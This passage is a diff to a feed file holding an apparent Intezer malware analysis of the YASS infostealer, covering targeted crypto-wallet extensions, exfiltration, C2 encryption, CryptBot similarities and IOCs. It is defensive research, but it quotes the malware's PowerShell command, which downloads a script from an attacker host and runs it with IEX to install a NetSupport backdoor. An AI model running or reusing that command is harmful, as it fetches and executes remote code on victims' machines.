+&lt;td style="text-align: left"&gt;&lt;code&gt;ookjlbkiijinhpmnjffcofjonbfbgaoc&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;Temple Tezos Wallet&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;nlbmnnijcnlegkjjpcfjclmcfggfefdm&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;MyEtherWallet&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;cjelfplplebdjjenllpjcblmjkfcffne&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;Jaxx Liberty&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;hpglfhgfnhbgpjdenjgmdgoeiappafln&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;Guarda&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;fhmfendgdocmcbmfikdcogofphimnkno&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;Sollet&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: left"&gt;&lt;code&gt;imloifkgjagghnncjkhggdhalmcnfklk&lt;/code&gt;&lt;/td&gt;
+&lt;td style="text-align: left"&gt;Trezor Password Manager&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;The stealer also searches for other more generic folders that might hold
+sensitive browser and wallet information. The stealer will look for references
+to login data, cookies, web data, user data, backups and wallets. Brave browser
+and Telegram are targeted also.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/blog/2024/09/cryptbot-yet-another-silly-stealer-yass/images/fig18.png" title="Targeted Files" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Targeted Files&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;The stolen files are built up into a structured ZIP file before being
+exfiltrated. Along with a log of the stolen files, and a screenshot of the
+victim machine.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/blog/2024/09/cryptbot-yet-another-silly-stealer-yass/images/fig19.png" title="Exfiltrated Data Structure" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Exfiltrated Data Structure&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;The directories in the exfiltrated ZIP file are structured in a way to help the
+recipient threat actor better navigate the stolen data. The main categories
+are:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Apps&lt;/li&gt;
+&lt;li&gt;Browsers&lt;/li&gt;
+&lt;li&gt;Files&lt;/li&gt;
+&lt;li&gt;Wallets&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The infostealer has an optional auxiliary method of stealing. YASS can iterate
+through a number of hardcoded drives and look for files which it considers
+&amp;ldquo;Other&amp;rdquo; category, sending it to a different server from the main activities.
+This may be used to attempt to collect miscellaneous files to run parsers
+through at a later stage.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/blog/2024/09/cryptbot-yet-another-silly-stealer-yass/images/fig20.png" title="Additional Stealing Method" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Additional Stealing Method&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h3&gt;Information Gathering&lt;span class="hx:absolute hx:-mt-20" id="information-gathering"&gt;&lt;/span&gt;
+&lt;a href="#information-gathering" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;YASS will gather information, into a text file, about the infected computer to
+send to the C2. The information is gathered mainly from the registry or through
+Windows API calls. Information includes localized information about the machine
+such as username and language, as well as physical aspects such as the
+processor, RAM, and GPU. This is collated into a text file before being sent to
+the C2.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/blog/2024/09/cryptbot-yet-another-silly-stealer-yass/images/fig21.png" title="Completed Fingerprint TXT File" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Completed Fingerprint TXT File&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h3&gt;C2 Communication&lt;span class="hx:absolute hx:-mt-20" id="c2-communication"&gt;&lt;/span&gt;
+&lt;a href="#c2-communication" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;YASS communicates with the C2 via HTTP POST requests. All information and
+stolen files are first collected and packaged into a ZIP file. Before the ZIP
+file is sent to the C2, it is encrypted via RC4 using an interesting technique.
+YASS will generate a unique key for each file sent.&lt;/p&gt;
+&lt;p&gt;The unique key is a concatenation of a key from the decrypted block of strings
+and a dynamically generated key that is unique with each POST request. In order
+for the server to be able to decrypt the data, the latter half of the RC4 key
+is shared through the filename metadata of the form data. This increases
+resistance to decryption of the stolen data by unauthorized parties, and also
+makes detection harder for defenders as there are no discernible patterns in
+order to create detections based on network signatures.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/blog/2024/09/cryptbot-yet-another-silly-stealer-yass/images/fig22.png" title="Format of RC4 Encryption Key" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Format of RC4 Encryption Key&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;YASS does not expect any specific reply from the server. The server will reply
+&amp;ldquo;OK&amp;rdquo; when it receives information from the stealer.&lt;/p&gt;
+&lt;h3&gt;NetSupport Client&lt;span class="hx:absolute hx:-mt-20" id="netsupport-client"&gt;&lt;/span&gt;
+&lt;a href="#netsupport-client" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The stealer also has the ability to drop the NetSupport Client as a backdoor
+for the infected machine. The client is deployed via a PowerShell command and
+script.&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-powershell" data-lang="powershell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="n"&gt;powershell&lt;/span&gt; &lt;span class="n"&gt;-NoP&lt;/span&gt; &lt;span class="n"&gt;-NonI&lt;/span&gt; &lt;span class="n"&gt;-ExecutionPolicy&lt;/span&gt; &lt;span class="n"&gt;Bypass&lt;/span&gt; &lt;span class="n"&gt;-Command&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="nv"&gt;$Resp&lt;/span&gt;&lt;span class="s2"&gt; = Invoke-WebRequest -Uri &amp;#39;https://brewdogebar[.]com/code.vue&amp;#39; -UseBasicParsing -UserAgent &amp;#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36&amp;#39;; &lt;/span&gt;&lt;span class="nv"&gt;$Scr&lt;/span&gt;&lt;span class="s2"&gt; = [System.Text.Encoding]::UTF8.GetString(&lt;/span&gt;&lt;span class="nv"&gt;$Resp&lt;/span&gt;&lt;span class="s2"&gt;.Content); IEX &lt;/span&gt;&lt;span class="nv"&gt;$Scr&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;The PowerShell command reaches out to a server to download an additional
+script. The
+&lt;a href="https://gist.github.com/aslefhewqiwbepqwefbpqsciwueh/bfd728e043262c90ef5af2e8228bbf6c"target="_blank" rel="noopener"&gt;PowerShell script&lt;/a&gt;
+downloads components for the NetSupport remote access tool, with a
+configuration file. The script also sets persistence and informs the server if
+target crypto wallet folders are detected.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/blog/2024/09/cryptbot-yet-another-silly-stealer-yass/images/fig23.png" title="PowerShell Script Downloading NetSupport" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;PowerShell Script Downloading NetSupport&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2&gt;CryptBot - CryptNot - CryptWhat?!&lt;span class="hx:absolute hx:-mt-20" id="cryptbot---cryptnot---cryptwhat"&gt;&lt;/span&gt;
+&lt;a href="#cryptbot---cryptnot---cryptwhat" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Over the years CryptBot has been under continuous development. The
+modifications of CryptBot have been documented in other blogs, particularly by
+AhnLab [&lt;a href="https://asec.ahnlab.com/en/26052/"target="_blank" rel="noopener"&gt;1&lt;/a&gt;,
+&lt;a href="https://asec.ahnlab.com/en/31802/"target="_blank" rel="noopener"&gt;2&lt;/a&gt;]. Much like the
+&lt;a href="https://en.wikipedia.org/wiki/Ship_of_Theseus"target="_blank" rel="noopener"&gt;Ship of Theseus&lt;/a&gt;, this
+infostealer challenges the essence of identity. Though its code has been
+entirely replaced compared to its original versions. The behavioral echoes are
+unmistakable, pointing to the same malware developer behind it. With this in
+mind, we wish to talk about some of the similarities and differences.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/blog/2024/09/cryptbot-yet-another-silly-stealer-yass/images/fig24.png" title="Initial Triage Showing Unknown Code" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Initial Triage Showing Unknown Code&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;When we first came across this file, we did not see any significant code
+overlap with any other known code stealers. There is a notable overlap in
+targeted software with other stealers, particularly LummaC2. Another similarity
+with LummaC2 is the use of ZIP files and a
+&lt;a href="https://outpost24.com/blog/everything-you-need-to-know-lummac2-stealer/"target="_blank" rel="noopener"&gt;one-way command and control server&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;The strings share many overlaps with other stealers. This would be quite
+expected as competing malware developers would be able to see what folders or
+applications their competitors are targeting and add those paths to their own
+stealing mechanisms. YASS shares strings with Vidar, AMOS, ImBetter, RedLine,
+Sharp, Arkei, Atomic, and SolarMarker&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/blog/2024/09/cryptbot-yet-another-silly-stealer-yass/images/fig25.png" title="Related Strings" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Related Strings&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;While YASS uses techniques similar to CryptBot, the implementation is
+different. The shared techniques with CryptBot include:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Use of a folder as a mutex&lt;/li&gt;
+&lt;li&gt;Exfil server using a &amp;ldquo;.top&amp;rdquo; TLD.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://fr3d.hk/blog/cryptbot-too-good-to-be-true"target="_blank" rel="noopener"&gt;Stealing SQLite database files&lt;/a&gt;
+instead of querying the data.&lt;/li&gt;
+&lt;li&gt;Similar system information report structure.&lt;/li&gt;
+&lt;li&gt;Similar POST request to the exfil server.&lt;/li&gt;
+&lt;li&gt;Shared strings&lt;/li&gt;
+&lt;li&gt;Secondary exfil server&lt;/li&gt;
+&lt;li&gt;Additional payload deployment&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Even though we see these similarities, we aren&amp;rsquo;t comfortable classifying YASS
+as just a newer version of CryptBot. There are also some significant
+differences. This stealer doesn&amp;rsquo;t have a well-structured configuration, uses a
+different encryption scheme, and has hardcoded functionality, via PowerShell,
+to download and install the NetSupport client. Many of the format strings look
+very similar but use different specifiers, the produced strings look the same,
+but the &amp;ldquo;implementation&amp;rdquo; is different. YASS also has some unused strings that
+are used by CryptBot. It&amp;rsquo;s like all the code has been rewritten, and a few
+strings have been forgotten and left, much like
+&lt;a href="https://en.wikipedia.org/wiki/Vestigiality"target="_blank" rel="noopener"&gt;vestigial organs&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;We can&amp;rsquo;t tell if the strings have been planted and that YASS has been made to
+imitate CryptBot as much as possible. It is
+&lt;a href="../../../2021/09/vermilionstrike-reimplementation-cobaltstrike/"&gt;not&lt;/a&gt; the
+first time we have come across malware that imitates other malware. So are we
+seeing an attempt to deflect suspicion towards malware that&amp;rsquo;s in the hot water?
+In April 2023, the United States District Court Southern District Of New York
+unsealed a
+&lt;a href="https://regmedia.co.uk/2023/04/28/handout_google_cryptbot_complaint.pdf"target="_blank" rel="noopener"&gt;complaint filed&lt;/a&gt;
+by Google against some distributors and the creator of CryptBot, so making your
+infostealer appear as CryptBot may keep a target off your back. The alternative
+is a &amp;ldquo;Ship of Theseus&amp;rdquo;. Either way, we are happy to present CryptBot&amp;rsquo;s latest
+step-sibling: YASS.&lt;/p&gt;
+&lt;h2&gt;IOCs&lt;span class="hx:absolute hx:-mt-20" id="iocs"&gt;&lt;/span&gt;
+&lt;a href="#iocs" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;LNK file&lt;/strong&gt;&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;e3bf61f6f96d1a121a1f7f47188cd36fc51f4565ca8cd8fc07207e56a038e7ca&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;strong&gt;HTA (EXE)&lt;/strong&gt;&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;fd7654c5bb79652bc0db2696da35497b9aff2c783ec4c83705d33d329dc742d8
+https://nextomax.b-cdn[.]net/nexto (Hosting Server)
+https://forikabrof[.]click/flkhfaiouwrqkhfasdrhfsa.png (Pinged by PowerShell Script)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;strong&gt;ZIP&lt;/strong&gt;&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;b2080e7705283fce7e03c8895977c5e8c451b5f8a6eb3faecb8acb986a1587c6
+https://nextomax.b-cdn[.]net/L2.zip (Hosting Server)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;strong&gt;IDATLOADER&lt;/strong&gt;&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;4810333bf96fb808604f3657118c734c3dd8ee4baa3e6ffe8da548ae0c8e15d3&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;strong&gt;YASS (Stealer)&lt;/strong&gt;&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;7ac46eb84f4b6d25601f23d2c30b7e80b6f3b2d82d3240234fc50af75290a29f (Unpacked from IDATLOADER)
+rceight8sr[.]top
+grabios[.]org&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;strong&gt;NetSupport RAT&lt;/strong&gt;&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;brewdogebar[.]com (Hosting Server)
+enotik5050[.]com
+barsuk5050[.]com
+94.232.244[.]133&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="hx:overflow-x-auto hx:mt-6 hx:flex hx:flex-col hx:rounded-lg hx:border hx:py-4 hx:px-4 hx:border-gray-200 hx:contrast-more:border-current hx:contrast-more:dark:border-current hx:border-blue-200 hx:bg-blue-100 hx:text-blue-900 hx:dark:border-blue-200/30 hx:dark:bg-blue-900/30 hx:dark:text-blue-200"&gt;
+&lt;p class="hx:flex hx:items-center hx:font-medium"&gt;&lt;svg height=16px class="hx:inline-block hx:align-middle hx:mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"&gt;&lt;path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/&gt;&lt;/svg&gt;Note&lt;/p&gt;
+&lt;div class="hx:w-full hx:min-w-0 hx:leading-7"&gt;
+&lt;div class="hx:mt-6 hx:leading-7 hx:first:mt-0"&gt;&lt;p&gt;Learn more about &lt;a href="https://intezer.com/?utm=research"target="_blank" rel="noopener"&gt;Intezer&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;</description></item><item><title>CryptoClippy is Evolving to Pilfer Even More Financial Data</title><link>https://research.intezer.com/blog/2023/05/cryptoclippy-evolves-to-pilfer-more-financial-data/</link><pubDate>Wed, 24 May 2023 00:00:00 +0000</pubDate><guid>https://research.intezer.com/blog/2023/05/cryptoclippy-evolves-to-pilfer-more-financial-data/</guid><description>
 &lt;p&gt;A banking trojan is a malware designed to steal sensitive financial
 information, such as online banking login credentials, credit card numbers, and
 other financial data. Recently Unit42 released a detailed
